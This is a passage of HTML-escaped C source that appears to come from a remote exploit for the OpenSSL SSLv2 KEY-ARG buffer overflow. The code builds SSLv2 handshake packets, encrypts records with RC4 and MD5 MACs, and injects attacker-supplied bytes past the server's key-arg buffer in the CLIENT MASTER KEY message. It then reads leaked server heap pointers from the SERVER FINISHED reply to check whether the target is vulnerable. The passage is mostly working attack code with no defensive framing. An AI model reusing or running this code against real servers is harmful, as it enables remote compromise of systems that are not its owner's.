&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (buf[0] == SSL2_MT_ERROR) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (rec_len != 3) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Malformed server error message\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 0;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return rec_len;<br/>
}<br/>
<br/>
/* send an ssl packet, encrypting it if ssl-&gt;encrypted is set */<br/>
void send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char buf[BUFSIZE];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char* p;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int tot_len;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; MD5_CTX ctx;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int seq;<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (ssl-&gt;encrypted)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tot_len = rec_len + MD5_DIGEST_LENGTH; &nbsp;/* RC4 needs no padding */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tot_len = rec_len;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (2 + tot_len &gt; BUFSIZE) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("send_ssl_packet: Record length out of range (rec_len = %d)\n", rec_len);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; p = buf;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; s2n(tot_len, p);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; buf[0] = buf[0] | 0x80; /* two byte header */<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (ssl-&gt;encrypted) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* calculate the MAC */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; seq = ntohl(ssl-&gt;write_seq);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Init(&amp;ctx);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Update(&amp;ctx, ssl-&gt;write_key, RC4_KEY_LENGTH);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Update(&amp;ctx, rec, rec_len);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Update(&amp;ctx, &amp;seq, 4);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Final(p, &amp;ctx);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p+=MD5_DIGEST_LENGTH;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy(p, rec, rec_len);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* encrypt the payload */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RC4(ssl-&gt;rc4_write_key, tot_len, &amp;buf[2], &amp;buf[2]);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy(p, rec, rec_len);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send(ssl-&gt;sock, buf, 2 + tot_len, 0);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* the sequence number is incremented by both encrypted and plaintext packets<br/>
*/<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;write_seq++;<br/>
}<br/>
<br/>
/* Send a CLIENT HELLO message to the server */<br/>
void send_client_hello(ssl_conn *ssl)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int i;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char buf[BUFSIZE] =<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x01" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* client hello msg */<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x00\x02" &nbsp; &nbsp; &nbsp; &nbsp;/* client version */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x00\x18" &nbsp; &nbsp; &nbsp; &nbsp;/* cipher specs length */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp;/* session id length */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x00\x10" &nbsp; &nbsp; &nbsp; &nbsp;/* challenge length */<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x07\x00\xc0\x05\x00\x80\x03\x00" &nbsp; &nbsp; &nbsp;/* cipher specs data */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x80\x01\x00\x80\x08\x00\x80\x06"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x00\x40\x04\x00\x80\x02\x00\x80"<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ""; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* session id data */<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* generate CHALLENGE LENGTH bytes of challenge data */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; for (i = 0; i &lt; CHALLENGE_LENGTH; i++) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;challenge[i] = (unsigned char) (rand() &gt;&gt; 24);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; memcpy(&amp;buf[33], ssl-&gt;challenge, CHALLENGE_LENGTH);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);<br/>
}<br/>
<br/>
/* Get a SERVER HELLO response from the server */<br/>
void get_server_hello(ssl_conn* ssl)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char buf[BUFSIZE];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; //unsigned char *p, *end;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; const unsigned char *p, *end;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int len;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int server_version, cert_length, cs_length, conn_id_length;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int found;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&amp;buf[1])));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (len &lt; 11) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get_server_hello: Packet too short (len = %d)\n", len);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; p = buf;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (*(p++) != SSL2_MT_SERVER_HELLO) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get_server_hello: Expected SSL2 MT SERVER HELLO, got %x\n", (int)p[-1]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (*(p++) != 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get_server_hello: SESSION-ID-HIT is not 0\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (*(p++) != 1) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get_server_hello: CERTIFICATE-TYPE is not SSL CT X509 CERTIFICATE\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; n2s(p, server_version);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (server_version != 2) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get_server_hello: Unsupported server version %d\n", server_version);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; n2s(p, cert_length);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; n2s(p, cs_length);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; n2s(p, conn_id_length);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (len != 11 + cert_length + cs_length + conn_id_length) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get_server_hello: Malformed packet size\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* read the server certificate */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;x509 = NULL;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;x509=d2i_X509(NULL,&amp;p,(long)cert_length);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (ssl-&gt;x509 == NULL) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get server hello: Cannot parse x509 certificate\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (cs_length % 3 != 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get server hello: CIPHER-SPECS-LENGTH is not a multiple of 3\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; found = 0;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; for (end=p+cs_length; p &lt; end; p += 3) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((p[0] == 0x01) &amp;&amp; (p[1] == 0x00) &amp;&amp; (p[2] == 0x80))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; found = 1; &nbsp; &nbsp; &nbsp;/* SSL CK RC4 128 WITH MD5 */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (!found) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get server hello: Remote server does not support 128 bit RC4\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (conn_id_length &gt; SSL2_MAX_CONNECTION_ID_LENGTH) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get server hello: CONNECTION-ID-LENGTH is too long\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* The connection id is sent back to the server in the CLIENT FINISHED packet */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;conn_id_length = conn_id_length;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; memcpy(ssl-&gt;conn_id, p, conn_id_length);<br/>
}<br/>
<br/>
/* Send a CLIENT MASTER KEY message to the server */<br/>
<br/>
void send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int encrypted_key_length, key_arg_length, record_length;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char* p;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int i;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; EVP_PKEY *pkey=NULL;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char buf[BUFSIZE] =<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x02" &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/* client master key message */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x01\x00\x80" &nbsp;/* cipher kind */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x00\x00" &nbsp; &nbsp; &nbsp; &nbsp;/* clear key length */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x00\x40" &nbsp; &nbsp; &nbsp; &nbsp;/* encrypted key length */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "\x00\x08"; &nbsp; &nbsp; &nbsp; /* key arg length */<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; p = &amp;buf[10];<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* generate a 128 byte master key */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; for (i = 0; i &lt; RC4_KEY_LENGTH; i++) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;master_key[i] = (unsigned char) (rand() &gt;&gt; 24);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; pkey=X509_get_pubkey(ssl-&gt;x509);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (!pkey) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("send client master key: No public key in the server certificate\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; //if (pkey-&gt;type != EVP_PKEY_RSA) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (EVP_PKEY_get1_RSA(pkey) == NULL) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("send client master key: The public key in the server certificate is not a RSA key\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; /* Encrypt the client master key with the server public key and put it in the packet */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; //encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], pkey-&gt;pkey.rsa, RSA_PKCS1_PADDING);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (encrypted_key_length &lt;= 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("send client master key: RSA encryption failure\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; p += encrypted_key_length;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (key_arg_overwrite) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* These 8 bytes fill the key arg array on the server */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for (i = 0; i &lt; 8; i++) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *(p++) = (unsigned char) (rand() &gt;&gt; 24);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; /* This overwrites the data following the key arg array */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy(p, key_arg_overwrite, key_arg_overwrite_len);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; key_arg_length = 8 + key_arg_overwrite_len;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; key_arg_length = 0; &nbsp; &nbsp; /* RC4 doesn't use KEY-ARG */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; p = &amp;buf[6];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; s2n(encrypted_key_length, p);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; s2n(key_arg_length, p);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; record_length = 10 + encrypted_key_length + key_arg_length;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send_ssl_packet(ssl, buf, record_length);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;encrypted = 1;<br/>
}<br/>
void generate_key_material(ssl_conn* ssl)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned int i;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; MD5_CTX ctx;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char *km;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char c='0';<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; km=ssl-&gt;key_material;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; for (i=0; i&lt;RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Init(&amp;ctx);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Update(&amp;ctx,ssl-&gt;master_key,RC4_KEY_LENGTH);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Update(&amp;ctx,&amp;c,1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; c++;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Update(&amp;ctx,ssl-&gt;challenge,CHALLENGE_LENGTH);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Update(&amp;ctx,ssl-&gt;conn_id, ssl-&gt;conn_id_length);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MD5_Final(km,&amp;ctx);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; km+=MD5_DIGEST_LENGTH;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
}<br/>
void generate_session_keys(ssl_conn* ssl)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; generate_key_material(ssl);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;read_key = &amp;(ssl-&gt;key_material[0]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; RC4_set_key(ssl-&gt;rc4_read_key, RC4_KEY_LENGTH, ssl-&gt;read_key);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;write_key = &amp;(ssl-&gt;key_material[RC4_KEY_LENGTH]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl-&gt;rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; RC4_set_key(ssl-&gt;rc4_write_key, RC4_KEY_LENGTH, ssl-&gt;write_key);<br/>
}<br/>
void get_server_verify(ssl_conn* ssl)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char buf[BUFSIZE];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int len;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&amp;buf[1])));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (len != 1 + CHALLENGE_LENGTH) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get server verify: Malformed packet size\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (buf[0] != SSL2_MT_SERVER_VERIFY) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get server verify: Expected SSL2 MT SERVER VERIFY, got %x\n", (int)buf[0]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (memcmp(ssl-&gt;challenge, &amp;buf[1], CHALLENGE_LENGTH)) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get server verify: Challenge strings don't match\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
}<br/>
void send_client_finished(ssl_conn* ssl)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char buf[BUFSIZE];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; buf[0] = SSL2_MT_CLIENT_FINISHED;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; memcpy(&amp;buf[1], ssl-&gt;conn_id, ssl-&gt;conn_id_length);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send_ssl_packet(ssl, buf, 1+ssl-&gt;conn_id_length);<br/>
}<br/>
void get_server_finished(ssl_conn* ssl)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char buf[BUFSIZE];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int len;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int i;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&amp;buf[1])));<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (buf[0] != SSL2_MT_SERVER_FINISHED) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get server finished: Expected SSL2 MT SERVER FINISHED, got %x\n", (int)buf[0]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (len &lt;= 112 /*17*/) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("This server is not vulnerable to this attack.\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; cipher = *(int*)&amp;buf[101];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ciphers = *(int*)&amp;buf[109];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("cipher: 0x%x &nbsp; ciphers: 0x%x\n", cipher, ciphers);<br/>
}<br/>
void get_server_error(ssl_conn* ssl)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; unsigned char buf[BUFSIZE];<br/>
